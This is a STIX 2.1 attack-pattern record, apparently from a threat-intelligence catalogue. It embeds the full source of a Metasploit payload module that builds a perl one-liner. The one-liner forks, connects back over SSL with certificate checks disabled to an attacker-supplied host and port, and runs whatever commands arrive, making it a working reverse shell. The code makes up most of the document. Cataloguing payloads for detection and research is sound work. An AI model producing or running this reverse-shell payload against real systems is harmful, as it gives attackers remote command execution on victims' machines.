{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70b1be9a-e70b-4b67-a5f7-d1f641f2e44a",
    "created": "2024-08-14T16:33:19.326549Z",
    "modified": "2024-08-14T16:33:19.326553Z",
    "name": "Unix Command Shell, Reverse TCP SSL (via perl)",
    "description": "Creates an interactive shell via perl, uses SSL",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_perl_ssl.rb",
            "external_id": "reverse_perl_ssl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 173\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Reverse TCP SSL (via perl)',\n     'Description'   => 'Creates an interactive shell via perl, uses SSL',\n     'Author'        => 'RageLtMan <rageltman[at]sempervictus>',\n     'License'       => BSD_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::ReverseTcpSsl,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'perl',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('PerlPath', [true, 'The path to the Perl executable', 'perl'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    lhost = datastore['LHOST']\n    ver   = Rex::Socket.is_ipv6?(lhost) ? \"6\" : \"\"\n    lhost = \"[#{lhost}]\" if Rex::Socket.is_ipv6?(lhost)\n    cmd = \"#{datastore['PerlPath']} -e 'use IO::Socket::SSL;$p=fork;exit,if($p);\"\n    cmd += \"$c=IO::Socket::SSL->new(PeerAddr=>\\\"#{lhost}:#{datastore['LPORT']}\\\",SSL_verify_mode=>0);\"\n    cmd += \"while(sysread($c,$i,8192)){syswrite($c,`$i`);}'\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}